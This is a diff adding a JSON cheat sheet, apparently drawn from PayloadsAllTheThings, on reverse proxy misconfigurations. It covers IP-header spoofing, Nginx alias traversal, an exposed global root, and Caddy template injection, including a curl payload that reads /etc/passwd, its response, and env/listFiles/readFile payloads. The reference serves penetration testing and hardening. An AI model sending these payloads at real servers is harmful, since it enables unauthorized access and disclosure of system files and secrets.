@@ -1,0 +1,150 @@
+{
+  "category": "Reverse Proxy Misconfigurations",
+  "source": "PayloadsAllTheThings/Reverse Proxy Misconfigurations/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What a reverse proxy is and where it breaks",
+      "language": "text",
+      "tags": ["methodology", "recon"],
+      "body": "A reverse proxy sits between the client and the backends: it forwards requests, hides the internal infrastructure, and often balances load and caches.\nProxy misconfigurations lead to problems:\n• Incorrect access control -> reaching internal/protected endpoints.\n• Lack of sanitization in proxy_pass / location -> directory traversal, reading other people's files.\n• Trusting client headers (X-Forwarded-For, X-Real-IP, True-Client-IP) -> IP spoofing, bypassing address-based restrictions.\nBottom line: unauthorized access, traversal, leakage of internal resources."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Tools",
+      "language": "text",
+      "tags": ["methodology", "tools"],
+      "body": "yandex/gixy - a static analyzer for Nginx configs.\nMegaManSec/Gixy-Next - an actively maintained Python3 fork of gixy.\nshiblisec/Kyubi - finding alias-traversal misconfigs in Nginx (off-by-slash).\nlaluka/bypass-url-parser - tries MANY URL bypasses to reach a 40X-protected page."
+    },
+    {
+      "subcategory": "Access control bypass",
+      "title": "bypass-url-parser - bypassing a 40X-protected endpoint",
+      "language": "bash",
+      "tags": ["access-control", "bypass", "403"],
+      "body": "bypass-url-parser -u \"http://127.0.0.1/juicy_403_endpoint/\" -s 8.8.8.8 -d\nbypass-url-parser -u /path/urls -t 30 -T 5 -H \"Cookie: me_iz=admin\" -H \"User-agent: test\"\nbypass-url-parser -R /path/request_file --request-tls -m \"mid_paths, end_paths\""
+    },
+    {
+      "subcategory": "Header smuggling",
+      "title": "Spoofing client IP headers",
+      "language": "text",
+      "tags": ["header", "spoofing", "x-forwarded-for"],
+      "body": "The headers X-Forwarded-For, X-Real-IP, and True-Client-IP are ordinary HTTP headers, so the client can set or override them if it controls part of the traffic path. Especially with a direct connection to the application server or when the proxy does not filter/validate these headers.\nUse it to spoof the source IP: bypass an address white-list, access admin panels \"only for 127.0.0.1\", bypass rate-limit and geo-restrictions."
+    },
+    {
+      "subcategory": "Header smuggling",
+      "title": "X-Forwarded-For - chain of proxies",
+      "language": "http",
+      "tags": ["header", "x-forwarded-for", "spoofing"],
+      "body": "X-Forwarded-For: 2.21.213.225, 104.16.148.244, 184.25.37.3"
+    },
+    {
+      "subcategory": "Header smuggling",
+      "title": "X-Forwarded-For - how it is formed and overridden",
+      "language": "text",
+      "tags": ["header", "x-forwarded-for"],
+      "body": "X-Forwarded-For is used to determine the source IP of the client connecting to the server through an HTTP proxy or load balancer.\nWhen a client goes through a proxy/balancer, the proxy adds X-Forwarded-For with the client's real IP.\nIf there are several proxies (the request passes through a chain), each proxy appends the address from which it received the request, separated by a comma.\nNginx can override the header with the client's real IP:\nproxy_set_header X-Forwarded-For $remote_addr;"
+    },
+    {
+      "subcategory": "Header smuggling",
+      "title": "X-Real-IP - a single address instead of a chain",
+      "language": "text",
+      "tags": ["header", "x-real-ip"],
+      "body": "X-Real-IP is a custom header, often used by Nginx and some proxies to pass the client's source IP. Unlike the X-Forwarded-For chain, X-Real-IP contains only one IP - the address of the client that connected to the first proxy."
+    },
+    {
+      "subcategory": "Header smuggling",
+      "title": "True-Client-IP - a header from providers (Akamai)",
+      "language": "text",
+      "tags": ["header", "true-client-ip", "akamai"],
+      "body": "True-Client-IP is a header developed and standardized by some providers, in particular Akamai, to pass the client's source IP through their infrastructure."
+    },
+    {
+      "subcategory": "NGINX off-by-slash (alias traversal)",
+      "title": "Off-by-slash - location matching logic",
+      "language": "text",
+      "tags": ["nginx", "alias-traversal", "off-by-slash"],
+      "body": "Nginx matches the request URI against location blocks. The presence/absence of a slash in the location changes the matching logic:\n• location /app/  -> matches /app/, /app/foo, /app/bar/123, etc.\n• location /app   (without a slash) -> matches /app* (i.e. /application, /appfile, etc.)"
+    },
+    {
+      "subcategory": "NGINX off-by-slash (alias traversal)",
+      "title": "Off-by-slash - the difference between location with and without a slash",
+      "language": "nginx",
+      "tags": ["nginx", "alias-traversal", "off-by-slash"],
+      "body": "server {\n  location /app/ {\n    # Handles /app/ and anything below, e.g., /app/foo\n  }\n  location /app {\n    # Handles only /app with nothing after OR routes like /application, /appzzz\n  }\n}"
+    },
+    {
+      "subcategory": "NGINX off-by-slash (alias traversal)",
+      "title": "Vulnerable alias without a slash -> traversal",
+      "language": "nginx",
+      "tags": ["nginx", "alias-traversal", "directory-traversal"],
+      "body": "location /styles {\n  alias /path/css/;\n}"
+    },
+    {
+      "subcategory": "NGINX off-by-slash (alias traversal)",
+      "title": "Exploiting alias-traversal",
+      "language": "text",
+      "tags": ["nginx", "alias-traversal", "directory-traversal"],
+      "body": "Example of a vulnerable configuration: the request /styles../secret.txt resolves to /path/styles/../secret.txt.\nBecause the location without a slash (/styles) matches /styles.., the slash after the location name is \"swallowed\", and ../ moves outside the alias."
+    },
+    {
+      "subcategory": "NGINX misconfig (access to internal files)",
+      "title": "Missing Root Location - the global root leaks out",
+      "language": "text",
+      "tags": ["nginx", "root-location", "file-read"],
+      "body": "The directive root /etc/nginx; sets the server's root directory for static files.\nIf there is no root location / in the config, root applies globally.\nA request to /nginx.conf will resolve to /etc/nginx/nginx.conf - that is, it will serve the server config itself."
+    },
+    {
+      "subcategory": "NGINX misconfig (access to internal files)",
+      "title": "Missing Root Location - vulnerable config",
+      "language": "nginx",
+      "tags": ["nginx", "root-location", "file-read"],
+      "body": "server {\n  root /etc/nginx;\n\n  location /hello.txt {\n    try_files $uri $uri/ =404;\n    proxy_pass http://127.0.0.1:8080/;\n  }\n}"
+    },
+    {
+      "subcategory": "Caddy / proxy misconfig",
+      "title": "Caddy templates - SSTI via Go templates",
+      "language": "text",
+      "tags": ["caddy", "template-injection", "ssti"],
+      "body": "A Caddy config with the templates directive renders dynamic content via Go templates. Caddy processes the response string as a template and interpolates any variables (Go template syntax) from the specified request header.\nAny content inside curly braces is evaluated, including data from untrusted input. The readFile function is available in Caddy templates, so attacker input makes Caddy actually read a file and insert its content into the HTTP response."
+    },
+    {
+      "subcategory": "Caddy / proxy misconfig",
+      "title": "Caddy - vulnerable config with templates",
+      "language": "text",
+      "tags": ["caddy", "template-injection", "config"],
+      "body": ":80 {\n    root * /\n    templates\n    respond \"You came from {http.request.header.Referer}\"\n}"
+    },
+    {
+      "subcategory": "Caddy / proxy misconfig",
+      "title": "Caddy - reading /etc/passwd via Referer",
+      "language": "bash",
+      "tags": ["caddy", "template-injection", "file-read"],
+      "body": "curl -H 'Referer: {{readFile \"etc/passwd\"}}' http://localhost/"
+    },
+    {
+      "subcategory": "Caddy / proxy misconfig",
+      "title": "Caddy - response with the content of /etc/passwd",
+      "language": "http",
+      "tags": ["caddy", "template-injection", "file-read"],
+      "body": "HTTP/1.1 200 OK\nContent-Length: 716\nContent-Type: text/plain; charset=utf-8\nServer: Caddy\nDate: Thu, 24 Jul 2025 08:00:50 GMT\n\nYou came from root:x:0:0:root:/root:/bin/sh\nbin:x:1:1:bin:/bin:/sbin/nologin\ndaemon:x:2:2:daemon:/sbin:/sbin/nologin"
+    },
+    {
+      "subcategory": "Caddy / proxy misconfig",
+      "title": "Caddy templates - functions for exploitation",
+      "language": "table",
+      "tags": ["caddy", "template-injection", "file-read"],
+      "body": "",
+      "meta": {
+        "kind": "table",
+        "table": {
+          "headers": ["Payload", "Description"],
+          "rows": [
+            ["{{env \"VAR_NAME\"}}", "Get an environment variable"],
+            ["{{listFiles \"/\"}}", "List all files in a directory"],
+            ["{{readFile \"path/to/file\"}}", "Read a file"]
+          ]
+        }
+      }
+    }
+  ]
+}
